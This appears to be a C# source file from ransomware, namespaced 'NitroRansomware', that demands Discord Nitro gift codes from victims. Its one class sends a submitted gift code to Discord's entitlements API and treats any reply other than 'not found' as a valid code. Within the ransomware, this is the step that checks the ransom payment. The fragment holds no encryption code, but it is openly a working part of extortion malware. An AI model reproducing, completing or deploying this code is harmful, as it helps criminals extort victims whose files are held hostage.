using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace NitroRansomware;

internal class Nitro
{
	private static Logs logging = new Logs("DEBUG", 0);

	public static bool Check(string code)
	{
		using HttpClient httpClient = new HttpClient();
		string text = "https://discord.com/api/v8/entitlements/gift-codes/" + code + "?with_application=true&with_subscription_plan=true";
		logging.Debug(text);
		Task<HttpResponseMessage> async = httpClient.GetAsync(text);
		if (async.Result.StatusCode != HttpStatusCode.NotFound)
		{
			return true;
		}
		return false;
	}
}
